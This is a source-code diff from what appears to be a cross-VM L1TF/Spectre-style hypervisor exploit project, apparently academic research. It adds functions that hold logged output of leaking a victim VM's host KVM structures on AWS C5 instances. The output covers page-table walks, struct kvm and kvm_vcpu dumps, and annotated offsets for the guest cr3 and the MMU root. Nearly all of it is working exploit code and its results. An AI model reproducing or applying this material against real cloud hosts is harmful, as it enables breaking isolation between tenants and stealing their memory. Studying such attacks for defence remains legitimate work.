@@ -894,10 +894,14 @@ void reverse_after(hpa_t base, hpa_t pa, hva_t hdm, const char *name, int len)
 {
 	for (int off = 0; off < len; off += 8) {
 		u64 data = leak64(base, pa+off);
+
 		// for (int i = 1; i < 8; i++)
 		// 	data = leak64(base, pa+off);
 		// u64 data = 0;
 		// leak(&data, base, pa+off+5, 1); 
+
+		// u64 data = 0;
+		// leak(&data, base, pa+off, 1); 
 		fprintf(stderr, "dm %16lx | pa %12lx | %16s+%4x = %16lx\n", hdm+pa+off, pa+off, name, off, data);
 	}
 }
@@ -1987,4 +1991,195 @@ void reverse_gce_task_files_fdt_fd_priv(hpa_t base, hva_t hdm, hpa_t hcr3, hva_t
 	hva_t kvm_candidate = 0xffff93e45b1974c0; // at fd[9] + 0xc0
 	dump(leak64(base, kvm_candidate-hdm));
 	dump(OWN_KVM);
+}
+
+void reverse_aws_struct_kvm(void)
+{
+/* rain-vm-aws-c5-victim
+
+
+	void thijs_l1tf_leak(char *data, uintptr_t base, const uintptr_t phys_addr, const size_t length)
+	{
+	assert(0 < length && length <= 64 && (phys_addr & (64-1)) + length <= 64);
+
+		// half_spectre_start(base, phys_addr);
+		half_spectre_start(base, 0x17a101fa8000 + (phys_addr-0x9e092000));
+
+	========[CONFIG]========
+MACHINE:         AWS (2)
+HELPERS:          NO (0)
+LEAK:           SKIP (1)
+========================
+
+
+host_direct_map(base=9e39e218)
+--------------------------------------------------------------------------------
+
+own_vcpu(base=9e39e218, hdm=ffff9868c0000000)
+--------------------------------------------------------------------------------
+
+own_task(base=9e39e218, hdm=ffff9868c0000000, vcpu=ffff98695f2137c0)
+--------------------------------------------------------------------------------
+
+host_cr3(base=9e39e218, hdm=ffff9868c0000000, task=ffff98695f1eb2a0)
+--------------------------------------------------------------------------------
+
+host_walk_tasks(base=9e39e218, hdm=ffff9868c0000000, hcr3=9e154000, task_first=ffff98695f1eb2a0)
+--------------------------------------------------------------------------------
+
+vcpu_via_fds(base=9e39e218, hdm=ffff9868c0000000, task=ffff987b61afb2a0)
+--------------------------------------------------------------------------------
+
+	 * On rain-vm-aws-c5-victim:
+	 * struct kvm * to victim's kvm struct:
+	 * hva ffffb009c1fa8000 --> pgd    1000067 pud    10b2067 pmd   ac9ca067 pte   9e092063 pa   9e092000
+
+	reverse_after(base, 0x9e092000, 0, "struct kvm", 0x80);
+
+	0x9e39e218UL =         9e39e218
+	dm         9e092000 | pa     9e092000 |       struct kvm+   0 =                0
+	dm         9e092008 | pa     9e092008 |       struct kvm+   8 =                0
+	dm         9e092010 | pa     9e092010 |       struct kvm+  10 =                0
+	dm         9e092018 | pa     9e092018 |       struct kvm+  18 = ffffb009c1fa8018
+	dm         9e092020 | pa     9e092020 |       struct kvm+  20 = ffffb009c1fa8018
+	dm         9e092028 | pa     9e092028 |       struct kvm+  28 = ffff98695e1ebc00
+	dm         9e092030 | pa     9e092030 |       struct kvm+  30 = ffff98695f2a0000
+	dm         9e092038 | pa     9e092038 |       struct kvm+  38 = ffff98695e900000
+	dm         9e092040 | pa     9e092040 |       struct kvm+  40 = ffff98695e260000
+	dm         9e092048 | pa     9e092048 |       struct kvm+  48 = ffff98695f1f0000
+	dm         9e092050 | pa     9e092050 |       struct kvm+  50 = ffff98695f2d37c0
+	dm         9e092058 | pa     9e092058 |       struct kvm+  58 =                0
+	dm         9e092060 | pa     9e092060 |       struct kvm+  60 =                0
+	dm         9e092068 | pa     9e092068 |       struct kvm+  68 =                0
+	dm         9e092070 | pa     9e092070 |       struct kvm+  70 =                0
+	dm         9e092078 | pa     9e092078 |       struct kvm+  78 =                0
+
+
+	// Check that +0x48 and +0x50 indeed are kvm_vcpu's: there first fields should point back to struct kvm.
+	reverse_after(base, 0xffff98695f1f0000-HOST_DIRECT_MAP, 0, "struct kvm_cpu", 0x8);
+	reverse_after(base, 0xffff98695f2d37c0-HOST_DIRECT_MAP, 0, "struct kvm_cpu", 0x8);
+
+	dm         9f1f0000 | pa     9f1f0000 |   struct kvm_cpu+   0 = ffffb009c1fa8000
+	dm         9f2d37c0 | pa     9f2d37c0 |   struct kvm_cpu+   0 = ffffb009c1fa8000
+*/
+
+
+/* rain-vm-aws-c5-extra
+
+
+	void thijs_l1tf_leak(char *data, uintptr_t base, const uintptr_t phys_addr, const size_t length)
+	{
+	assert(0 < length && length <= 64 && (phys_addr & (64-1)) + length <= 64);
+
+		// half_spectre_start(base, phys_addr);
+		half_spectre_start(base, 0x17a101f91000 + (phys_addr-0x9e177000));
+
+========[CONFIG]========                                                                   
+MACHINE:         AWS (2)                                                                                                                                                               
+HELPERS:          NO (0)                                                                   
+LEAK:           SKIP (1)                                                                   
+========================                                                                                                                                                               
+                                                                                           
+                                                                                           
+host_direct_map(base=9e39e218)                                                             
+--------------------------------------------------------------------------------           
+                                                                                           
+own_vcpu(base=9e39e218, hdm=ffff9868c0000000)                                              
+--------------------------------------------------------------------------------           
+                                                                                           
+own_task(base=9e39e218, hdm=ffff9868c0000000, vcpu=ffff98695f2137c0)                       
+--------------------------------------------------------------------------------           
+                                                                                                                                                                                       
+host_cr3(base=9e39e218, hdm=ffff9868c0000000, task=ffff98695f1eb2a0)                       
+--------------------------------------------------------------------------------                                                                                                       
+                                                                                           
+host_walk_tasks(base=9e39e218, hdm=ffff9868c0000000, hcr3=9e154000, task_first=ffff98695f1eb2a0)
+--------------------------------------------------------------------------------           
+                                                                                                                                                                                       
+vcpu_via_fds(base=9e39e218, hdm=ffff9868c0000000, task=ffff987b61af9860)                   
+--------------------------------------------------------------------------------           
+
+	 * On rain-vm-aws-c5-extra:
+	 * hva ffffb009c1f91000 --> pgd    1000067 pud    10b2067 pmd   ac9ca067 pte   9e177063 pa   9e177000
+	 * hva ffffb009c1f91130 --> pgd    1000067 pud    10b2067 pmd   ac9ca067 pte   9e178063 pa   9e178130
+
+	reverse_after(base, 0x9e177000, 0, "struct kvm", 0x2000);
+
+                  0x9e39e218UL =         9e39e218
+dm         9e177000 | pa     9e177000 |       struct kvm+   0 =                0
+dm         9e177008 | pa     9e177008 |       struct kvm+   8 =                0
+dm         9e177010 | pa     9e177010 |       struct kvm+  10 =                0
+dm         9e177018 | pa     9e177018 |       struct kvm+  18 = ffffb009c1f91018
+dm         9e177020 | pa     9e177020 |       struct kvm+  20 = ffffb009c1f91018
+dm         9e177028 | pa     9e177028 |       struct kvm+  28 = ffff98695cb78780
+dm         9e177030 | pa     9e177030 |       struct kvm+  30 = ffff98695e2a0000
+dm         9e177038 | pa     9e177038 |       struct kvm+  38 = ffff98695f1a0000
+dm         9e177040 | pa     9e177040 |       struct kvm+  40 = ffff98695e280000
+dm         9e177048 | pa     9e177048 |       struct kvm+  48 = ffff98695f20b7c0
+dm         9e177050 | pa     9e177050 |       struct kvm+  50 = ffff98695f2137c0
+dm         9e177058 | pa     9e177058 |       struct kvm+  58 =                0
+dm         9e177060 | pa     9e177060 |       struct kvm+  60 =                0
+dm         9e177068 | pa     9e177068 |       struct kvm+  68 =                0
+dm         9e177070 | pa     9e177070 |       struct kvm+  70 =                0
+dm         9e177078 | pa     9e177078 |       struct kvm+  78 =                0
+*/
+}
+
+void reverse_aws_struct_kvm_vcpu_arch(void)
+{
+/*
+kvm_vcpu+0x2d8 - 0xd0 +   0:  ffff98695f1f0208   08 02 1f 5f 69 98 ff ff ..._i...
+kvm_vcpu+0x2d8 - 0xd0 +   8:  ffff98695f1f0208   08 02 1f 5f 69 98 ff ff ..._i...
+kvm_vcpu+0x2d8 - 0xd0 +  10:                 0   00 00 00 00 00 00 00 00 ........
+kvm_vcpu+0x2d8 - 0xd0 +  18:           1010000   00 00 01 01 00 00 00 00 ........
+kvm_vcpu+0x2d8 - 0xd0 +  20:  ffffde0200004000   00 40 00 00 02 de ff ff .@......
+kvm_vcpu+0x2d8 - 0xd0 +  28:     10000ff41ffef   ef ff 41 ff 00 00 01 00 ..A.....
+kvm_vcpu+0x2d8 - 0xd0 +  30:          80050033   33 00 05 80 00 00 00 00 3.......
+kvm_vcpu+0x2d8 - 0xd0 +  38:                 8   08 00 00 00 00 00 00 00 ........
+kvm_vcpu+0x2d8 - 0xd0 +  40:      5dd072925740   40 57 92 72 d0 5d 00 00 @W.r.]..
+kvm_vcpu+0x2d8 - 0xd0 +  48:         1150b0004   04 00 0b 15 01 00 00 00 ........ <-- unsigned long kvm_vcpu_arch.cr3
+kvm_vcpu+0x2d8 - 0xd0 +  50:            7706f0   f0 06 77 00 00 00 00 00 ..w.....
+kvm_vcpu+0x2d8 - 0xd0 +  58:             1078e   8e 07 01 00 00 00 00 00 ........
+kvm_vcpu+0x2d8 - 0xd0 +  60:  ffffffffff88f800   00 f8 88 ff ff ff ff ff ........
+kvm_vcpu+0x2d8 - 0xd0 +  68:                 0   00 00 00 00 00 00 00 00 ........
+kvm_vcpu+0x2d8 - 0xd0 +  70:  5555555455555554   54 55 55 55 54 55 55 55 TUUUTUUU
+kvm_vcpu+0x2d8 - 0xd0 +  78:                 0   00 00 00 00 00 00 00 00 ........
+kvm_vcpu+0x2d8 - 0xd0 +  80:               d01   01 0d 00 00 00 00 00 00 ........
+kvm_vcpu+0x2d8 - 0xd0 +  88:          fee00d00   00 0d e0 fe 00 00 00 00 ........
+kvm_vcpu+0x2d8 - 0xd0 +  90:  ffff98695e15a400   00 a4 15 5e 69 98 ff ff ...^i...
+kvm_vcpu+0x2d8 - 0xd0 +  98:  ffff98695e15a400   00 a4 15 5e 69 98 ff ff ...^i...
+kvm_vcpu+0x2d8 - 0xd0 +  a0:                 0   00 00 00 00 00 00 00 00 ........
+kvm_vcpu+0x2d8 - 0xd0 +  a8:                 1   01 00 00 00 00 00 00 00 ........
+kvm_vcpu+0x2d8 - 0xd0 +  b0:         100000000   00 00 00 00 01 00 00 00 ........
+kvm_vcpu+0x2d8 - 0xd0 +  b8:                 0   00 00 00 00 00 00 00 00 ........
+kvm_vcpu+0x2d8 - 0xd0 +  c0:                 0   00 00 00 00 00 00 00 00 ........
+kvm_vcpu+0x2d8 - 0xd0 +  c8:                 0   00 00 00 00 00 00 00 00 ........
+kvm_vcpu+0x2d8 - 0xd0 +  d0:                 0   00 00 00 00 00 00 00 00 ........
+kvm_vcpu+0x2d8 - 0xd0 +  d8:                 1   01 00 00 00 00 00 00 00 ........
+kvm_vcpu+0x2d8 - 0xd0 +  e0:             30000   00 00 03 00 00 00 00 00 ........
+kvm_vcpu+0x2d8 - 0xd0 +  e8:                 0   00 00 00 00 00 00 00 00 ........
+kvm_vcpu+0x2d8 - 0xd0 +  f0:             10001   01 00 01 00 00 00 00 00 ........
+kvm_vcpu+0x2d8 - 0xd0 +  f8:   200700600000000   00 00 00 00 06 70 00 02 .....p..
+kvm_vcpu+0x2d8 - 0xd0 + 100:                4c   4c 00 00 00 00 00 00 00 L.......
+kvm_vcpu+0x2d8 - 0xd0 + 108:              2005   05 20 00 00 00 00 00 00 . ......
+kvm_vcpu+0x2d8 - 0xd0 + 110:  ffff98695f1f0320   20 03 1f 5f 69 98 ff ff  .._i... <-- struct kvm_mmu * kvm_vcpu_arch.mmu --> ARCH_ROOT_MMU
+kvm_vcpu+0x2d8 - 0xd0 + 118:  ffffffffa60710f0   f0 10 07 a6 ff ff ff ff ........ <-- start of `struct kvm_mmu root_mmu`
+kvm_vcpu+0x2d8 - 0xd0 + 120:  ffffffffa6070b90   90 0b 07 a6 ff ff ff ff ........
+kvm_vcpu+0x2d8 - 0xd0 + 128:  ffffffffa607e290   90 e2 07 a6 ff ff ff ff ........
+kvm_vcpu+0x2d8 - 0xd0 + 130:  ffffffffa60404d0   d0 04 04 a6 ff ff ff ff ........
+kvm_vcpu+0x2d8 - 0xd0 + 138:  ffffffffa607b210   10 b2 07 a6 ff ff ff ff ........
+kvm_vcpu+0x2d8 - 0xd0 + 140:  ffffffffa6071050   50 10 07 a6 ff ff ff ff P.......
+kvm_vcpu+0x2d8 - 0xd0 + 148:  ffffffffa60710b0   b0 10 07 a6 ff ff ff ff ........
+kvm_vcpu+0x2d8 - 0xd0 + 150:                 0   00 00 00 00 00 00 00 00 ........ <-- struct kvm_mmu_root_info root
+kvm_vcpu+0x2d8 - 0xd0 + 158:          9f35f000   00 f0 35 9f 00 00 00 00 ..5..... <-- hpa_t hpa
+kvm_vcpu+0x2d8 - 0xd0 + 160:                 0   00 00 00 00 00 00 00 00 ........
+kvm_vcpu+0x2d8 - 0xd0 + 168:      5cfd00003794   94 37 00 00 fd 5c 00 00 .7...\..
+kvm_vcpu+0x2d8 - 0xd0 + 170:           1000404   04 04 00 01 00 00 00 00 ........
+kvm_vcpu+0x2d8 - 0xd0 + 178:  ffffffffffffffff   ff ff ff ff ff ff ff ff ........
+kvm_vcpu+0x2d8 - 0xd0 + 180:  ffffffffffffffff   ff ff ff ff ff ff ff ff ........
+kvm_vcpu+0x2d8 - 0xd0 + 188:  ffffffffffffffff   ff ff ff ff ff ff ff ff ........
+kvm_vcpu+0x2d8 - 0xd0 + 190:  ffffffffffffffff   ff ff ff ff ff ff ff ff ........
+kvm_vcpu+0x2d8 - 0xd0 + 198:  ffffffffffffffff   ff ff ff ff ff ff ff ff ........
+kvm_vcpu+0x2d8 - 0xd0 + 1a0:  ffffffffffffffff   ff ff ff ff ff ff ff ff ........
+*/
 }
